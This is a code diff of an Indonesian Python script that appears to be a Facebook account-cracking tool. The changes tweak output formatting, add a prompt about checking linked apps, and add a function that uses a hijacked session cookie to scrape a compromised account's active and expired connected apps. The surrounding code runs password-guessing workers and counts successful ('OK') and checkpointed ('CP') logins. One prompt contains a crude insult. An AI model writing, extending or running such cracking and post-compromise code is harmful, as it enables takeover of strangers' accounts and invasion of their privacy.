@@ -284,11 +284,11 @@ def info_user():
         zona_waktu = data.get('timezone')
         
         prints(nel(f'                      {P2}[bold blue]Info User{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
-        print(f"✶[bold purple] Alamat IP{x}: [blue]{alamat_ip}")
-        print(f"✶[bold purple] Region{x}: [blue]{region}")
-        print(f"✶[bold purple] Lokasi{x}: [blue]{lokasi}")
-        print(f"✶[bold purple] Kota{x}: [blue]{kota}")
-        print(f"✶[bold purple] Zona Waktu{x}: [blue]{zona_waktu}")
+        print(f"✶[bold purple] Alamat IP: [blue]{alamat_ip}")
+        print(f"✶[bold purple] Region: [blue]{region}")
+        print(f"✶[bold purple] Lokasi: [blue]{lokasi}")
+        print(f"✶[bold purple] Kota: [blue]{kota}")
+        print(f"✶[bold purple] Zona Waktu: [blue]{zona_waktu}")
 
     except Exception as e:
         print(f"Error: {e}")
@@ -723,6 +723,15 @@ def setting():
 		method.append('metod4')
 	else:
 		method.append('metod1')
+	print('')
+	_jembot_ = input('>> Tambahkan Aplikasi Terkait ( Y/t ) ')
+	if _jembot_ in ['']:
+		print('>> Pilih Yang Bener Kontol ')
+		back()
+	elif _jembot_ in ['y','Y']:
+		taplikasi.append('ya')
+	else:
+		taplikasi.append('no')
 	prints(nel(f'              {P2}{B}Manual Password?{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
 	pwplus=input(f'✶ ━━⫸ {H}Tambahkan Password Manual {N}{M}( Y/t ) {N}')
 	if pwplus in ['y','Y']:
@@ -777,7 +786,7 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print(f'[[blue]•{x}][bold green] OK : [bold green]%s '%(ok))
-	print(f'{x}[[blue]•{x}][bold yellow]CP : [bold yellow]%s{x} '%(cp))
+	print(f'[[blue]•{x}][bold yellow]CP : [bold yellow]%s '%(cp))
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
 	global loop,ok,cp
@@ -1673,6 +1682,26 @@ def kska():
         jalan(f"\n{P}[{H}✓{P}]  Selamat Apikey Anda Berhasil Didaftarkan");time.sleep(3);open("lisensimu.txt", "a").write(xx);login();cuak()
     else:
         print(f"\n{P}[[red]!{P}] Api Key Anda Belum Terdaftar");time.sleep(1);ngewe()
+#----------------------[ CEK-APLIKASI ]---------------------#
+def cek_apk(session,cookie):
+	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
+	else:
+		for i in range(len(game)):
+			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+	w=session.get("https://x.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
+	else:
+		for i in range(len(game)):
+			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
 #-----------------------[ SYSTEM-CONTROL ]--------------------#
 if __name__=='__main__':
 	try:os.system('git pull')
@@ -1688,4 +1717,3 @@ if __name__=='__main__':
 	try:os.system('clear')
 	except:pass
 	login()
-	dapatkan_informasi_ip()
